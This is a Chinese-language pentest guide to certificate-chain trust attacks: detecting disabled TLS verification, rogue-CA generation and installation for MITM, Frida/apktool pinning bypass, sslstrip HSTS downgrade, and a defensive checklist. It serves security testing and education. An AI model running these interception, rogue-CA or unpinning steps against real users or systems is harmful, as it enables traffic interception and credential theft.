# 证书链信任攻击

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供证书链信任攻击的系统性方法论。证书链验证是 TLS/SSL 安全的核心，当证书链验证存在缺陷时，攻击者可实施中间人攻击、证书伪造等攻击。本指南帮助测试人员识别和利用证书链验证漏洞。

## 1.2 适用范围

本文档适用于以下场景：
- TLS/SSL 证书链验证缺陷测试
- 中间人攻击证书伪造
- 自签名证书信任绕过
- 证书颁发机构 (CA) 信任链攻击
- 证书吊销检查绕过
- 证书绑定 (Pinning) 绕过

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、PKI 安全测试人员、应用安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

证书链信任攻击针对的是 X.509 证书链验证过程中的缺陷。TLS/SSL 连接依赖于证书链建立信任，从服务器证书到中间 CA，最终到根 CA。验证过程中的任何缺陷都可能导致信任被破坏。

**CWE 映射:**

| CWE 编号 | 描述 | 风险等级 |
|---------|------|---------|
| CWE-295 | 证书验证不当 | 严重 |
| CWE-296 | 证书信任链跟踪不当 | 严重 |
| CWE-297 | 主机名验证不当 | 高危 |
| CWE-324 | 使用过期密钥 | 中危 |

### 证书链验证流程

```
正常验证流程:

1. 接收服务器证书
         │
         ▼
2. 验证证书签名
   (使用中间 CA 公钥)
         │
         ▼
3. 验证中间 CA 证书
   (使用根 CA 公钥)
         │
         ▼
4. 验证根 CA 在信任存储中
         │
         ▼
5. 检查证书有效期
         │
         ▼
6. 检查证书吊销状态
   (CRL/OCSP)
         │
         ▼
7. 验证主机名匹配
         │
         ▼
8. 验证通过，建立连接
```

### 常见攻击类型

| 攻击类型 | 描述 | 利用的缺陷 |
|---------|------|-----------|
| **自签名证书接受** | 客户端接受任意自签名证书 | 未验证证书链 |
| **信任所有证书** | 客户端信任任何证书 | 禁用证书验证 |
| **中间人证书注入** | 攻击者注入恶意中间 CA | 信任存储污染 |
| **证书吊销绕过** | 不检查 CRL/OCSP | 吊销检查缺失 |
| **主机名绕过** | 不验证 CN/SAN | 主机名验证缺失 |
| **过期证书接受** | 接受过期证书 | 有效期检查缺失 |
| **弱签名算法** | 接受 MD5/SHA1 签名 | 算法检查缺失 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 | 潜在危害 |
|---------|---------|-----------|---------|
| **移动应用** | iOS/Android App | 禁用证书验证 | 流量劫持、数据窃取 |
| **IoT 设备** | 嵌入式设备通信 | 自签名证书、无验证 | 设备劫持、固件篡改 |
| **内部系统** | 内网 API 服务 | 自签名证书、信任所有 | 内网渗透、凭证窃取 |
| **微服务** | 服务间 TLS 通信 | 证书验证配置错误 | 服务间通信劫持 |
| **桌面应用** | Electron/原生应用 | 证书验证实现缺陷 | 用户数据泄露 |
| **API 客户端** | HTTP 客户端库 | verify=false 配置 | API 响应篡改 |
| **开发/测试环境** | 本地开发服务器 | 禁用 HTTPS 验证 | 开发凭证泄露 |
| **代理工具** | Burp/ZAP 代理 | 用户安装代理 CA | 流量拦截分析 |
| **企业网络** | 企业 SSL 检查 | 企业根 CA 注入 | 员工流量监控 |
| **CDN/边缘** | CDN HTTPS 终止 | 证书配置错误 | 内容注入、数据窃取 |

## 2.3 漏洞检测方法

### 2.3.1 证书验证配置检测

**Python 代码检测:**

```python
#!/usr/bin/env python3
"""
证书验证配置检测
"""
import re
import os

def detect_certificate_validation_issues(code_path):
    """检测代码中的证书验证问题"""
    
    print("[*] 证书验证配置检测")
    
    issues = []
    
    # Python 模式
    python_patterns = [
        (r'verify\s*=\s*False', 'requests 库禁用证书验证'),
        (r'_create_unverified_context', 'SSL 未验证上下文'),
        (r'check_hostname\s*=\s*False', '主机名验证禁用'),
        (r'verify_mode\s*=\s*CERT_NONE', '证书验证模式禁用'),
        (r'self\.signed\.cert', '自签名证书使用'),
        (r'InsecureRequestWarning', '不安全请求警告被抑制'),
    ]
    
    # Java 模式
    java_patterns = [
        (r'TrustAllCertificates', '信任所有证书实现'),
        (r'checkServerTrusted\s*\(\s*\{\s*\}', '空信任管理器'),
        (r'HostnameVerifier.*ACCEPT_ALL', '接受所有主机名'),
        (r'SSLContext.*getInstance\("SSL"\)', '使用旧 SSL 协议'),
    ]
    
    # JavaScript/Node 模式
    js_patterns = [
        (r'rejectUnauthorized\s*:\s*false', 'Node.js 禁用证书验证'),
        (r'tls\.connect.*rejectUnauthorized.*false', 'TLS 连接不验证'),
    ]
    
    # 扫描文件
    for root, dirs, files in os.walk(code_path):
        # 跳过 node_modules, .git 等
        if any(skip in root for skip in ['node_modules', '.git', '__pycache__']):
            continue
            
        for file in files:
            if file.endswith(('.py', '.java', '.js', '.ts', '.go', '.rb')):
                file_path = os.path.join(root, file)
                
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                        
                        # 根据文件类型选择模式
                        patterns = []
                        if file.endswith('.py'):
                            patterns = python_patterns
                        elif file.endswith('.java'):
                            patterns = java_patterns
                        elif file.endswith(('.js', '.ts')):
                            patterns = js_patterns
                        
                        for pattern, description in patterns:
                            matches = re.finditer(pattern, content, re.IGNORECASE)
                            for match in matches:
                                line_num = content[:match.start()].count('\n') + 1
                                issues.append({
                                    'file': file_path,
                                    'line': line_num,
                                    'pattern': pattern,
                                    'description': description
                                })
                
                except Exception as e:
                    pass
    
    # 报告结果
    print(f"\n[!] 发现 {len(issues)} 个证书验证问题:\n")
    
    for issue in issues:
        print(f"    文件：{issue['file']}")
        print(f"    行号：{issue['line']}")
        print(f"    问题：{issue['description']}")
        print(f"    模式：{issue['pattern']}")
        print()
    
    return issues

# 使用示例
# detect_certificate_validation_issues('/path/to/code')
```

**Nmap 证书检测:**

```bash
# 使用 Nmap 检测证书问题
nmap --script ssl-cert,ssl-enum-ciphers,ssl-date,ssl-heartbleed \
     -p 443 target.com

# 检测自签名证书
nmap --script ssl-cert -p 443 target.com | grep -A5 "Issuer"

# 检测证书链
nmap --script ssl-cert -p 443 target.com | grep -A20 "Certificate chain"
```

### 2.3.2 证书链完整性检测

```bash
#!/bin/bash
# 证书链完整性检测脚本

TARGET=$1
PORT=${2:-443}

echo "[*] 检测证书链完整性：$TARGET:$PORT"
echo "========================================"

# 获取完整证书链
echo | openssl s_client -connect $TARGET:$PORT -showcerts 2>/dev/null | \
    openssl x509 -noout -issuer -subject -dates

echo ""
echo "[*] 证书链详情:"
echo | openssl s_client -connect $TARGET:$PORT -showcerts 2>/dev/null | \
    grep -E "s:|i:"

echo ""
echo "[*] 检查证书链验证:"
echo | openssl s_client -connect $TARGET:$PORT -CApath /etc/ssl/certs 2>&1 | \
    grep -E "Verify return code|verify error"

echo ""
echo "[*] 检查中间证书缺失:"
# 如果仅返回服务器证书，可能中间证书缺失
CERT_COUNT=$(echo | openssl s_client -connect $TARGET:$PORT -showcerts 2>/dev/null | \
    grep -c "BEGIN CERTIFICATE")

if [ $CERT_COUNT -eq 1 ]; then
    echo "[!] 仅发现 1 个证书 - 可能缺少中间证书"
elif [ $CERT_COUNT -eq 2 ]; then
    echo "[i] 发现 2 个证书 - 服务器证书 + 中间证书"
else
    echo "[i] 发现 $CERT_COUNT 个证书"
fi

# 使用 testssl.sh 进行完整检测
# ./testssl.sh $TARGET:$PORT
```

### 2.3.3 证书吊销检查检测

```python
#!/usr/bin/env python3
"""
证书吊销检查检测
"""
import ssl
import socket
from urllib.parse import urlparse

def check_crl_ocsp_support(target, port=443):
    """检查目标的 CRL/OCSP 支持"""
    
    print(f"[*] 检查证书吊销支持：{target}")
    
    result = {
        'crl_distribution_points': [],
        'ocsp_responder': [],
        'must_staple': False
    }
    
    try:
        # 获取证书
        context = ssl.create_default_context()
        with socket.create_connection((target, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=target) as ssock:
                cert = ssock.getpeercert(binary_form=True)
                
                # 解析证书（需要 pyOpenSSL 或 cryptography 库）
                from cryptography import x509
                from cryptography.hazmat.backends import default_backend
                
                cert_obj = x509.load_der_x509_certificate(cert, default_backend())
                
                # 检查 CRL 分发点
                try:
                    crl_dp = cert_obj.extensions.get_extension_for_class(
                        x509.CRLDistributionPoints
                    )
                    for dp in crl_dp.value:
                        if dp.full_name:
                            for name in dp.full_name:
                                if isinstance(name, x509.UniformResourceIdentifier):
                                    result['crl_distribution_points'].append(name.value)
                except x509.ExtensionNotFound:
                    pass
                
                # 检查 OCSP
                try:
                    ocsp = cert_obj.extensions.get_extension_for_class(
                        x509.AuthorityInformationAccess
                    )
                    for access_desc in ocsp.value:
                        if access_desc.access_method == x509.oid.AuthorityInformationAccessOID.OCSP:
                            if isinstance(access_desc.access_location, 
                                         x509.UniformResourceIdentifier):
                                result['ocsp_responder'].append(
                                    access_desc.access_location.value
                                )
                except x509.ExtensionNotFound:
                    pass
                
                # 检查 OCSP Must-Staple
                try:
                    tls_feature = cert_obj.extensions.get_extension_for_oid(
                        x509.oid.ExtensionOID.TLS_FEATURE
                    )
                    # 检查是否包含 status_request (OCSP Must-Staple)
                    result['must_staple'] = True
                except x509.ExtensionNotFound:
                    pass
    
    except Exception as e:
        print(f"[-] 检测失败：{e}")
    
    # 报告
    print(f"\n    CRL 分发点:")
    for dp in result['crl_distribution_points']:
        print(f"      - {dp}")
    
    print(f"\n    OCSP 响应器:")
    for ocsp in result['ocsp_responder']:
        print(f"      - {ocsp}")
    
    print(f"\n    OCSP Must-Staple: {'是' if result['must_staple'] else '否'}")
    
    # 风险评估
    if not result['crl_distribution_points'] and not result['ocsp_responder']:
        print("\n    [!] 警告：证书无吊销检查机制")
    
    return result

# 使用示例
# check_crl_ocsp_support('target.com')
```

### 2.3.4 自动化证书审计脚本

```python
#!/usr/bin/env python3
"""
证书链安全审计自动化
"""
import ssl
import socket
import subprocess
from datetime import datetime

class CertificateAuditor:
    def __init__(self, target, port=443):
        self.target = target
        self.port = port
        self.findings = []
    
    def audit_certificate_chain(self):
        """审计证书链"""
        
        print(f"[*] 开始证书链审计：{self.target}:{self.port}")
        print("=" * 60)
        
        # 1. 获取证书信息
        self._check_certificate_info()
        
        # 2. 验证证书链
        self._verify_certificate_chain()
        
        # 3. 检查证书吊销
        self._check_revocation()
        
        # 4. 检查主机名验证
        self._check_hostname_validation()
        
        # 5. 检查已知漏洞
        self._check_known_vulnerabilities()
        
        # 输出报告
        self._generate_report()
    
    def _check_certificate_info(self):
        """检查证书基本信息"""
        
        print("\n[1] 证书基本信息")
        
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.target, self.port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                    cert = ssock.getpeercert()
                    
                    subject = dict(x[0] for x in cert.get('subject', []))
                    issuer = dict(x[0] for x in cert.get('issuer', []))
                    
                    print(f"    主题：{subject}")
                    print(f"    颁发者：{issuer}")
                    print(f"    版本：{cert.get('version', 'Unknown')}")
                    print(f"    序列号：{cert.get('serialNumber', 'Unknown')}")
                    print(f"    签名算法：{cert.get('signatureAlgorithm', 'Unknown')}")
                    
                    # 检查有效期
                    not_before = cert.get('notBefore')
                    not_after = cert.get('notAfter')
                    
                    print(f"    有效期：{not_before} 至 {not_after}")
                    
                    # 检查是否过期
                    not_after_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    if not_after_date < datetime.now():
                        self.findings.append({
                            'severity': 'HIGH',
                            'issue': '证书已过期',
                            'detail': f'过期时间：{not_after}'
                        })
                        print("    [!] 证书已过期!")
                    
                    # 检查签名算法
                    sig_algo = cert.get('signatureAlgorithm', '').lower()
                    if 'md5' in sig_algo or 'sha1' in sig_algo:
                        self.findings.append({
                            'severity': 'MEDIUM',
                            'issue': '使用弱签名算法',
                            'detail': f'算法：{sig_algo}'
                        })
                        print(f"    [!] 使用弱签名算法：{sig_algo}")
        
        except Exception as e:
            print(f"    [-] 获取证书失败：{e}")
            self.findings.append({
                'severity': 'HIGH',
                'issue': '无法获取证书',
                'detail': str(e)
            })
    
    def _verify_certificate_chain(self):
        """验证证书链"""
        
        print("\n[2] 证书链验证")
        
        try:
            # 使用系统信任存储验证
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            
            with socket.create_connection((self.target, self.port), timeout=10) as sock:
                try:
                    with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                        print("    [+] 证书链验证通过")
                except ssl.SSLCertVerificationError as e:
                    print(f"    [!] 证书链验证失败：{e}")
                    self.findings.append({
                        'severity': 'CRITICAL',
                        'issue': '证书链验证失败',
                        'detail': str(e)
                    })
        
        except Exception as e:
            print(f"    [-] 验证过程出错：{e}")
    
    def _check_revocation(self):
        """检查证书吊销状态"""
        
        print("\n[3] 证书吊销检查")
        
        # 使用 OpenSSL 检查 OCSP
        try:
            result = subprocess.run(
                ['openssl', 's_client', '-connect', f'{self.target}:{self.port}',
                 '-status', '-noout'],
                capture_output=True, text=True, timeout=10
            )
            
            if 'OCSP' in result.stderr or 'OCSP' in result.stdout:
                print("    [i] 支持 OCSP")
            else:
                print("    [!] 未发现 OCSP 支持")
                self.findings.append({
                    'severity': 'LOW',
                    'issue': 'OCSP 支持缺失',
                    'detail': '建议启用 OCSP 或 OCSP Stapling'
                })
        
        except Exception as e:
            print(f"    [-] OCSP 检查失败：{e}")
    
    def _check_hostname_validation(self):
        """检查主机名验证"""
        
        print("\n[4] 主机名验证")
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            
            with socket.create_connection((self.target, self.port), timeout=10) as sock:
                with context.wrap_socket(sock, server_hostname=self.target) as ssock:
                    cert = ssock.getpeercert()
                    
                    # 检查 SAN
                    san = cert.get('subjectAltName', [])
                    print(f"    SAN: {san}")
                    
                    # 检查 CN
                    subject = dict(x[0] for x in cert.get('subject', []))
                    cn = subject.get('commonName', '')
                    print(f"    CN: {cn}")
                    
                    # 验证主机名匹配
                    if self.target not in [s[1] for s in san] and self.target != cn:
                        print(f"    [!] 主机名不匹配")
                        self.findings.append({
                            'severity': 'CRITICAL',
                            'issue': '主机名不匹配',
                            'detail': f'目标：{self.target}, 证书：{cn}, SAN: {san}'
                        })
                    else:
                        print("    [+] 主机名验证通过")
        
        except Exception as e:
            print(f"    [-] 主机名验证出错：{e}")
    
    def _check_known_vulnerabilities(self):
        """检查已知漏洞"""
        
        print("\n[5] 已知漏洞检查")
        
        # 使用 testssl.sh 检查
        try:
            result = subprocess.run(
                ['./testssl.sh', '--fast', f'{self.target}:{self.port}'],
                capture_output=True, text=True, timeout=300,
                cwd='/opt/testssl.sh'  # 假设 testssl.sh 安装位置
            )
            
            # 解析输出查找漏洞
            vulnerabilities = []
            for vuln in ['POODLE', 'BEAST', 'CRIME', 'BREACH', 'HEARTBLEED', 'FREAK', 'Logjam']:
                if vuln in result.stdout:
                    vulnerabilities.append(vuln)
            
            if vulnerabilities:
                print(f"    [!] 可能存在漏洞：{', '.join(vulnerabilities)}")
                self.findings.append({
                    'severity': 'HIGH',
                    'issue': '已知漏洞',
                    'detail': ', '.join(vulnerabilities)
                })
            else:
                print("    [+] 未发现已知漏洞")
        
        except Exception as e:
            print(f"    [-] 漏洞检查失败：{e}")
    
    def _generate_report(self):
        """生成审计报告"""
        
        print("\n" + "=" * 60)
        print("证书链审计报告")
        print("=" * 60)
        
        if not self.findings:
            print("\n[+] 未发现安全问题")
        else:
            print(f"\n[!] 发现 {len(self.findings)} 个问题:\n")
            
            for finding in sorted(self.findings, key=lambda x: x['severity']):
                print(f"    [{finding['severity']}] {finding['issue']}")
                print(f"        {finding['detail']}")
                print()
        
        print("=" * 60)

# 使用示例
# auditor = CertificateAuditor('target.com')
# auditor.audit_certificate_chain()
```

## 2.4 漏洞利用方法

### 2.4.1 中间人攻击 - 自签名证书

```python
#!/usr/bin/env python3
"""
中间人攻击 - 自签名证书
"""
from mitmproxy import ctx, http

class SelfSignedMITM:
    """
    使用自签名证书的中间人攻击
    """
    
    def request(self, flow: http.HTTPFlow):
        """拦截请求"""
        
        # 记录请求
        print(f"[+] 拦截请求：{flow.request.url}")
        
        # 可以修改请求
        # flow.request.headers["X-Intercepted"] = "true"
    
    def response(self, flow: http.HTTPFlow):
        """拦截响应"""
        
        # 记录响应
        print(f"[+] 拦截响应：{flow.response.status_code}")
        
        # 可以修改响应
        # if flow.response.text:
        #     flow.response.text = flow.response.text.replace("https://", "http://")

# 使用 mitmproxy 运行
# mitmweb --mode transparent --scripts self_signed_mitm.py

def generate_self_signed_cert():
    """
    生成自签名证书
    """
    
    print("""
    生成自签名证书:
    
    1. 使用 OpenSSL 生成:
    
    openssl req -x509 -newkey rsa:2048 \
        -keyout key.pem -out cert.pem \
        -days 365 -nodes \
        -subj "/C=US/ST=State/L=City/O=Org/CN=target.com"
    
    2. 配置 mitmproxy 使用:
    
    mitmweb --certs target.com=cert.pem:key.pem
    
    3. 如果目标应用接受自签名证书，攻击成功
    
    注意:
    - 现代应用通常拒绝自签名证书
    - 需要配合其他技术（如证书验证禁用）
    """)

# 使用示例
# generate_self_signed_cert()
```

### 2.4.2 证书验证绕过攻击

```python
#!/usr/bin/env python3
"""
证书验证绕过攻击
"""
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# 禁用警告（仅用于演示）
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def exploit_certificate_bypass(target_url):
    """
    利用证书验证绕过
    
    适用于目标应用禁用证书验证的场景
    """
    
    print(f"[*] 利用证书验证绕过：{target_url}")
    
    # 场景 1: 禁用证书验证的请求
    print("\n[1] 禁用证书验证请求")
    
    try:
        # verify=False 禁用证书验证
        response = requests.get(target_url, verify=False, timeout=10)
        
        print(f"    状态码：{response.status_code}")
        print(f"    响应长度：{len(response.content)}")
        print(f"    [!] 请求成功 - 证书验证被绕过")
        
        # 可以窃取敏感数据
        if 'password' in response.text.lower() or 'token' in response.text.lower():
            print("    [!] 响应中包含敏感信息")
    
    except Exception as e:
        print(f"    [-] 请求失败：{e}")
    
    # 场景 2: 中间人攻击
    print("\n[2] 中间人攻击设置")
    
    print("""
    设置中间人代理:
    
    1. 启动 mitmproxy:
       mitmweb --mode transparent
    
    2. 配置目标连接到代理
    
    3. 如果目标禁用证书验证:
       - 所有流量可被拦截
       - 可读取和修改所有数据
    
    4. 导出拦截的数据:
       mitmproxy --export-flow
    """)

def certificate_pinning_bypass():
    """
    证书绑定绕过信息
    """
    
    print("""
    证书绑定 (Certificate Pinning) 绕过:
    
    证书绑定是一种防御 MITM 的技术，应用只接受特定证书。
    
    绕过方法:
    
    1. Frida Hook
    
    使用 Frida 拦截证书验证函数:
    
    frida -U -f com.target.app \
        -l ssl-unpinning.js --no-pause
    
    ssl-unpinning.js 示例:
    ```javascript
    Java.perform(function() {
        var TrustManager = Java.use(
            "javax.net.ssl.X509TrustManager"
        );
        TrustManager.checkServerTrusted.implementation = function() {};
    });
    ```
    
    2. 反编译修改
    
    反编译 APK，修改证书验证逻辑，重新打包
    
    3. 代理配置
    
    某些应用允许配置代理证书
    
    4. 旧版本利用
    
    旧版本应用可能未实施证书绑定
    """)
```

### 2.4.3 信任存储污染攻击

```python
#!/usr/bin/env python3
"""
信任存储污染攻击
"""

def trust_store_pollution_attack():
    """
    信任存储污染攻击信息
    """
    
    print("""
    信任存储污染攻击:
    
    原理:
    - 向系统/应用信任存储添加恶意 CA
    - 该 CA 签发的证书将被信任
    - 可对任何网站进行 MITM
    
    攻击场景:
    
    1. 企业 SSL 检查
    
    企业安装自己的根 CA 到员工设备:
    - 可解密所有 HTTPS 流量
    - 监控员工网络活动
    - 潜在隐私侵犯
    
    2. 恶意软件安装 CA
    
    恶意软件获取权限后:
    - 安装恶意 CA 到系统信任存储
    - 拦截所有 HTTPS 流量
    - 窃取凭证、会话
    
    3. 物理访问攻击
    
    攻击者物理访问设备:
    - 解锁设备
    - 安装恶意 CA
    - 后续可 MITM
    
    检测方法:
    
    1. 检查系统信任存储:
    
    # Linux
    ls -la /etc/ssl/certs/
    update-ca-certificates --verbose
    
    # Android
    设置 > 安全 > 加密和凭据 > 用户凭据
    
    # iOS
    设置 > 通用 > 关于本机 > 证书信任设置
    
    2. 检查异常 CA:
    
    openssl x509 -in suspicious_cert.pem \
        -noout -issuer -subject
    
    防御:
    
    - 限制 CA 安装权限
    - 定期审计信任存储
    - 使用证书绑定
    - 监控信任存储变更
    """)

def install_malicious_ca_steps():
    """
    恶意 CA 安装步骤（教育目的）
    """
    
    print("""
    恶意 CA 安装步骤（仅用于理解攻击）:
    
    1. 生成恶意 CA:
    
    openssl genrsa -out malicious_ca.key 2048
    openssl req -x509 -new -nodes \
        -key malicious_ca.key \
        -sha256 -days 365 \
        -out malicious_ca.pem \
        -subj "/CN=Malicious CA"
    
    2. 生成目标网站证书:
    
    openssl genrsa -out target.com.key 2048
    openssl req -new \
        -key target.com.key \
        -out target.com.csr \
        -subj "/CN=target.com"
    
    3. 用恶意 CA 签名:
    
    openssl x509 -req \
        -in target.com.csr \
        -CA malicious_ca.pem \
        -CAkey malicious_ca.key \
        -CAcreateserial \
        -out target.com.crt \
        -days 365 \
        -sha256
    
    4. 安装恶意 CA 到系统:
    
    # Android (需要 root)
    adb push malicious_ca.pem /sdcard/
    # 手动在设置中安装
    
    # Linux
    sudo cp malicious_ca.pem /usr/local/share/ca-certificates/
    sudo update-ca-certificates
    
    5. 使用恶意证书进行 MITM:
    
    mitmweb --certs target.com=target.com.crt:key
    
    警告:
    - 仅用于授权测试
    - 未授权安装 CA 是违法行为
    """)
```

### 2.4.4 证书吊销绕过攻击

```python
#!/usr/bin/env python3
"""
证书吊销绕过攻击
"""

def certificate_revocation_bypass():
    """
    证书吊销绕过攻击信息
    """
    
    print("""
    证书吊销绕过攻击:
    
    背景:
    - 证书可能因私钥泄露等原因被吊销
    - 客户端应检查 CRL/OCSP
    - 但许多客户端不检查或检查不严格
    
    攻击场景:
    
    1. 吊销检查缺失
    
    客户端不检查证书吊销:
    - 被吊销的证书仍被接受
    - 攻击者使用泄露的私钥
    - 进行 MITM 攻击
    
    2. CRL 获取失败处理
    
    客户端无法获取 CRL 时:
    - 某些客户端"软失败"接受证书
    - 攻击者阻断 CRL 访问
    - 使用被吊销证书
    
    3. OCSP 响应重放
    
    攻击者捕获有效 OCSP 响应:
    - 重放旧响应（证书当时有效）
    - 绕过吊销检查
    
    4. OCSP 响应伪造
    
    如果 OCSP 响应未签名:
    - 可伪造"有效"响应
    - 绕过吊销检查
    
    检测方法:
    
    1. 检查客户端行为:
    
    # 使用 Wireshark 监控
    # 连接被吊销证书的网站
    # 检查是否有 CRL/OCSP 请求
    
    2. 测试软失败:
    
    # 阻断 CRL/OCSP 访问
    # 观察客户端是否接受证书
    # 如果接受，存在软失败问题
    
    3. 检查证书吊销状态:
    
    openssl x509 -in cert.pem -noout -text | \
        grep -A5 "CRL Distribution"
    
    防御:
    
    - 强制实施吊销检查
    - 使用 OCSP Stapling
    - 实施 OCSP Must-Staple
    - 吊销失败时拒绝连接
    """)
```

## 2.5 漏洞利用绕过方法

### 2.5.1 绕过证书绑定

```python
#!/usr/bin/env python3
"""
绕过证书绑定的技术
"""

def bypass_certificate_pinning_techniques():
    """
    证书绑定绕过技术汇总
    """
    
    print("""
    技术 1: Frida SSL Unpinning
    
    通用 SSL Unpinning 脚本:
    
    ```javascript
    // Android
    Java.perform(function() {
        // TrustManager
        var TrustManager = Java.use(
            "javax.net.ssl.X509TrustManager"
        );
        var SSLContext = Java.use("javax.net.ssl.SSLContext");
        
        TrustManager.checkServerTrusted.implementation = function() {};
        
        SSLContext.init.overload(
            "[Ljavax.net.ssl.KeyManager;",
            "[Ljavax.net.ssl.TrustManager;",
            "java.security.SecureRandom"
        ).implementation = function() {
            this.init.apply(this, arguments);
        };
    });
    
    // iOS
    ObjC.schedule(ObjC.mainQueue, function() {
        var NSURLSession = ObjC.classes.NSURLSession;
        // Hook 验证方法
    });
    ```
    
    使用:
    frida -U -f com.target.app -l unpinning.js
    """)
    
    print("""
    技术 2: JustTrustMe (Xposed 模块)
    
    JustTrustMe 自动 Hook 常见 HTTP 库:
    - OkHttpClient
    - WebView
    - Apache HttpClient
    - etc.
    
    安装:
    1. 设备需要 Root + Xposed
    2. 安装 JustTrustMe APK
    3. 在 Xposed 中启用模块
    4. 重启设备
    
    支持的应用:
    - 大多数使用标准库的应用
    - 自定义实现可能不生效
    """)
    
    print("""
    技术 3: 反编译修改
    
    步骤:
    
    1. 反编译 APK:
       apktool d target.apk
    
    2. 查找证书验证代码:
       grep -r "checkServerTrusted" ./target/
       grep -r "HostnameVerifier" ./target/
    
    3. 修改 Smali 代码:
       将验证逻辑改为始终返回 true
    
    4. 重新打包:
       apktool b target/ -o target_modified.apk
    
    5. 签名并安装:
       jarsigner -verbose -keystore my.keystore \\
           target_modified.apk alias_name
    
    6. 测试修改后的应用
    """)
    
    print("""
    技术 4: 网络层 Hook
    
    针对特定网络库的 Hook:
    
    OkHttp:
    ```javascript
    var OkHttpClient = Java.use(
        "okhttp3.OkHttpClient"
    );
    OkHttpClient.certificatePinner.implementation = function() {
        return null;  // 返回空绑定
    };
    ```
    
    NSURLSession (iOS):
    ```javascript
    var NSURLSession = ObjC.classes.NSURLSession;
    // Hook delegate 方法
    ```
    
    Retrofit:
    ```javascript
    // Hook Retrofit 的 OkHttpClient 构建
    ```
    """)

### 2.5.2 绕过 HSTS 保护

```python
#!/usr/bin/env python3
"""
绕过 HSTS 保护的技术
"""

def bypass_hsts_protection():
    """
    HSTS 绕过技术
    """
    
    print("""
    HSTS (HTTP Strict Transport Security) 绕过:
    
    技术 1: 首次请求攻击
    
    描述:
    - HSTS 仅在浏览器收到 HSTS 头后生效
    - 首次 HTTP 请求未受保护
    
    利用:
    1. 在用户首次访问前拦截
    2. 使用 sslstrip 降级
    3. 窃取凭证
    
    工具:
    sslstrip -l 8080 -w capture.log
    
    防御:
    - HSTS 预加载列表
    - 域名提交到预加载列表
    """)
    
    print("""
    技术 2: 域名相似性攻击
    
    描述:
    - HSTS 按域名存储
    - 相似域名可能不受保护
    
    利用:
    target.com (有 HSTS)
    → target0.com (无 HSTS)
    → 诱导用户访问
    
    防御:
    - 注册相似域名
    - 使用 includeSubDomains
    """)
    
    print("""
    技术 3: 子域名绕过
    
    描述:
    - HSTS 未设置 includeSubDomains
    - 子域名不受保护
    
    利用:
    1. 访问 www.target.com (有 HSTS)
    2. 诱导访问 api.target.com (无 HSTS)
    3. 在子域名进行攻击
    
    防御:
    - 设置 includeSubDomains
    - 所有子域名实施 HSTS
    """)
    
    print("""
    技术 4: HTTP 链接注入
    
    描述:
    - HTTPS 页面包含 HTTP 链接
    - 用户点击后离开 HSTS 保护
    
    利用:
    1. XSS 注入 HTTP 链接
    2. 诱导用户点击
    3. 降级攻击
    
    防御:
    - 所有内容使用 HTTPS
    - CSP 限制资源加载
    """)
```

---

## 第三部分：附录

### 3.1 证书检测工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| testssl.sh | TLS/SSL 配置扫描 | https://testssl.sh/ |
| SSL Labs | 在线 SSL 测试 | https://ssllabs.com/ |
| OpenSSL | 命令行证书工具 | https://openssl.org/ |
| Nmap NSE | SSL 相关脚本 | https://nmap.org/ |
| mitmproxy | MITM 代理工具 | https://mitmproxy.org/ |
| Frida | 动态插桩工具 | https://frida.re/ |
| Burp Suite | Web 代理/扫描 | https://portswigger.net/ |

### 3.2 证书验证检查清单

**客户端验证检查:**
- [ ] 验证证书链完整性
- [ ] 验证根 CA 在信任存储中
- [ ] 检查证书有效期
- [ ] 检查证书吊销状态 (CRL/OCSP)
- [ ] 验证主机名匹配 (CN/SAN)
- [ ] 检查签名算法强度
- [ ] 拒绝自签名证书（生产环境）
- [ ] 实施证书绑定（高安全场景）

**服务器配置检查:**
- [ ] 使用可信 CA 颁发的证书
- [ ] 配置完整证书链
- [ ] 启用 OCSP Stapling
- [ ] 配置 HSTS
- [ ] 使用强签名算法 (SHA-256+)
- [ ] 证书有效期合理（≤1 年）
- [ ] 配置证书监控和自动更新

### 3.3 常见证书错误代码

**Python requests:**
```python
# 错误：禁用证书验证
requests.get(url, verify=False)  # ❌

# 正确：启用证书验证
requests.get(url, verify=True)  # ✅

# 正确：使用自定义 CA
requests.get(url, verify='/path/to/ca.pem')  # ✅
```

**Java:**
```java
// 错误：信任所有证书
TrustManager[] trustAll = new TrustManager[]{
    new X509TrustManager() {
        public void checkServerTrusted(...) {}  // 空实现 ❌
    }
};

// 正确：使用默认信任管理器
SSLContext context = SSLContext.getDefault();  // ✅
```

**Node.js:**
```javascript
// 错误：禁用证书验证
https.get(url, { rejectUnauthorized: false });  // ❌

// 正确：启用证书验证
https.get(url, { rejectUnauthorized: true });  // ✅
```

---

## 参考资源

- [OWASP Certificate Pinning Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Certificate_Pinning_Cheat_Sheet.html)
- [OWASP Transport Layer Protection](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html)
- [RFC 5280 - X.509 证书标准](https://www.rfc-editor.org/rfc/rfc5280)
- [RFC 6797 - HSTS](https://www.rfc-editor.org/rfc/rfc6797)
- [CWE-295: 证书验证不当](https://cwe.mitre.org/data/definitions/295.html)
- [CWE-296: 证书信任链跟踪不当](https://cwe.mitre.org/data/definitions/296.html)
